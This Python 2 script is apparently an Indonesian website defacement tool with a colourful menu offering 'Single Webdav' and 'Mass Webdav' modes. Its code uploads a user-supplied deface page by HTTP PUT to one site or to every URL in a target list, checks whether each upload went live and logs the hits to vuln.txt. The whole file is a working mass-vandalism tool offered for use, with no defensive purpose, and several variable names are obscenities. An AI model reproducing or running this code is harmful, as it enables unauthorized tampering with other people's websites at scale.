### ANDA PANTEK SEKALI ###
import os, sys, string, time, random, urllib
red = '\x1b[1;91m'
gre = '\x1b[1;92m'
yel = '\x1b[1;93m'
blu = '\x1b[1;94m'
mag = '\x1b[1;95m'
cya = '\x1b[1;96m'
whi = '\x1b[1;97m'
nor = '\x1b[0;39m'
warna = [mag,blu,whi,red,gre,cya,yel]
total = 0
vuln = 0
notvuln = 0
t = time.sleep
it = raw_input
et = sys.exit
ddf = red + '\xe2\x95\xba\xe2\x94\xb3\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x81\xe2\x95\xb8\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x93\xe2\x95\xbb' + whi + '\xe2\x95\xba\xe2\x94\xb3\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x81\xe2\x95\xb8\xe2\x94\x8f\xe2\x94\x81\xe2\x95\xb8\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x81\xe2\x95\xb8\xe2\x94\x8f\xe2\x94\x81\xe2\x95\xb8\n' + red + ' \xe2\x94\x83\xe2\x94\x83\xe2\x94\xa3\xe2\x94\xb3\xe2\x94\x9b\xe2\x94\xa3\xe2\x94\x81\xe2\x94\xab\xe2\x94\x83\xe2\x95\xba\xe2\x94\x93\xe2\x94\x83 \xe2\x94\x83\xe2\x94\x83\xe2\x94\x97\xe2\x94\xab' + whi + ' \xe2\x94\x83\xe2\x94\x83\xe2\x94\xa3\xe2\x95\xb8 \xe2\x94\xa3\xe2\x95\xb8 \xe2\x94\xa3\xe2\x94\x81\xe2\x94\xab\xe2\x94\x83  \xe2\x94\xa3\xe2\x95\xb8\n' + red + '\xe2\x95\xba\xe2\x94\xbb\xe2\x94\x9b\xe2\x95\xb9\xe2\x94\x97\xe2\x95\xb8\xe2\x95\xb9 \xe2\x95\xb9\xe2\x94\x97\xe2\x94\x81\xe2\x94\x9b\xe2\x94\x97\xe2\x94\x81\xe2\x94\x9b\xe2\x95\xb9 \xe2\x95\xb9' + whi + '\xe2\x95\xba\xe2\x94\xbb\xe2\x94\x9b\xe2\x94\x97\xe2\x94\x81\xe2\x95\xb8\xe2\x95\xb9  \xe2\x95\xb9 \xe2\x95\xb9\xe2\x94\x97\xe2\x94\x81\xe2\x95\xb8\xe2\x94\x97\xe2\x94\x81\xe2\x95\xb8' + nor
try:
	import requests
except Exception as x:
	os.system('pip2 install requests')
	t(1)

def tod(z,time):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		t(time)

def aaa():
	try:
		os.system('clear')
		print(ddf)
		print(yel + "\x1b[1;91m\xf0\x9d\x9a\x86\xf0\x9d\x9a\x8e\xf0\x9d\x9a\x8b\xf0\x9d\x9a\x8d\x1b[1;93m\xf0\x9d\x9a\x8a\xf0\x9d\x9a\x9f\xf0\x9d\x99\xb4\xf0\x9d\x9a\xa1\xf0\x9d\x9a\x99\xf0\x9d\x9a\x95\x1b[1;92m\xf0\x9d\x9a\x98\xf0\x9d\x9a\x92\xf0\x9d\x9a\x9d\xf0\x9d\x9a\x8e\xf0\x9d\x9a\x9b" + nor)
		print(yel + "Support  :  " + red + "./R3DB0T " + cya + "feat " + red + "./4N71R" + whi)
		print(yel + "[" + gre + "01" + yel + "] " + whi + "Single Webdav")
		print(yel + "[" + gre + "02" + yel + "] " + whi + "Mass Webdav")
		print(yel + "[" + gre + "00" + yel + "] " + red + "E X I T" + whi)
		gif = it(yel + "[" + gre + "DDEFACE" + yel + "]" + red + "> " + whi)
		if gif in ('',' ','	'):
			print('Don\'t Empty Dude!')
			et()
		elif gif in ('01','1'):
			single()
		elif gif in ('02','2'):
			mass()
		elif gif in ('00','0'):
			print("Exiting...")
			t(1.5)
			et()
		else:
			print("Your Choose is'nt in list!")
			et()
	except KeyboardInterrupt:
		print("Interrupted!")
		et()

def single():
	try:
		tod(red + 50*"=", 00.01)
		try:
			file = it("Your script deface: ")
			open(file,'r').read()
		except IOError:
			print("Script not found!\nTry Again!")
			et()
		webs = it("Vuln Website: ")
		with open(file, 'rb') as xxx:
			genjeh = xxx.read()
			bla = genjeh
		if webs.startswith('https'):
			webs = webs.replace('https','http')
		if not webs.startswith('http'):
			webs = 'http://' + webs
		proc = '/' + file
		print("Uploading " + file)
		try:
			up = requests.request('put', webs + proc, data=bla, headers={'Content-Type':'application/octet-stream'})
		except requests.exceptions.ConnectionError:
			print("There is a problem with your internet connection!")
			et()
		if up.status_code < 200 or up.status_code >=300:
			print("Upload Failed!")
			et()
		else:
			print("File uploaded!\nCheck now : " + webs + proc)
			it("Enter to open the result...")
			os.system('am start ' + webs + proc  + '> /dev/null')
	except KeyboardInterrupt:
		print("Interrupted!")
		et()

def mass():
	try:
		global total, vuln, notvuln
		tod(red + 50*"=", 00.01)
		try:
			file = it(red + "Your "+yel+"script "+gre+"deface: "+nor)
			if '/sdcard' in file:
				print(red + 'Put the script '+yel+'in this'+gre+' folder first!'+nor)
				et()
			else:
				open(file).read()
		except IOError:
			print(red + "Script "+yel+"not "+gre+"found!"+nor)
			et()
		try:
			webs = it(red + "Your "+yel+"web"+gre+"list      : "+nor)
			if '/sdcard' in webs:
				print(red + 'Put the weblist '+yel+'in this'+gre+' folder first!'+nor)
				et()
			else:
				open(webs).read()
		except IOError:
			print("Web list not found!\nTry Again!")
			et()
		target = open(webs, 'r')
		tod(red+50*"=", 00.01)
		while True:
			color = random.choice(warna)
			total +=1
			sempak = open(file).read()
			pantek = sempak
			memek = open('vuln.txt', 'a')
			bajingan = target.readline().replace('\n','')
			if not bajingan:
				break
			if not bajingan.startswith('http'):
				bajingan = 'http://' + bajingan
			kontol = '/' + file
			sys.stdout.write(color + '\rQueue ' + whi + ': ' + cya + '[' + whi+str(total)+cya + ']' + mag + '> ' + gre+str(vuln)+whi + ' | ' + red+str(notvuln)+color + ' => ' + whi)
			sys.stdout.flush()
			try:
				r = requests.request('put', bajingan + kontol, data=pantek, headers={'Content-Type':'application/octet-stream'})
			except requests.exceptions.ConnectionError:
				notvuln +=1
				pass
				continue
			except NameError:
				os.system('pip install requests')
				pass
				continue
			except:
				notvuln +=1
				pass
				continue
			if r.status_code == 200:
				upsy = requests.get(bajingan+kontol).text
				if 'error_code' in upsy:
					notvuln +=1
				else:
					vulncek = open('vuln.txt','r').read()
					if bajingan+kontol in vulncek:
						notvuln +=1
						print(yel + 'Already exists ' + whi)
						tod(red + 50*"\x1b[1;97m=", 00.001)
						pass
						continue
					else:
						vuln +=1
						print(gre+bajingan+kontol+whi)
						tod(red + 50*"\x1b[1;97m=", 00.001)
						memek.write(bajingan+kontol + '\n')
			else:
				notvuln +=1
		if vuln==0:
			tod('\n' + 50*"\x1b[1;97m=", 00.001)
			print(whi + '\rYou got nothing!')
			et()
		else:
			tod('\n' + 50*"\x1b[1;97m=", 00.001)
			print(whi + '\rVuln ' + str(vuln) + ' | Not Vuln ' + str(-1+notvuln))
			print(whi + '\rSaved on          : vuln.txt')
			et()
	except KeyboardInterrupt:
		print("Interrupted!")
		et()

if __name__=='__main__':
	aaa()

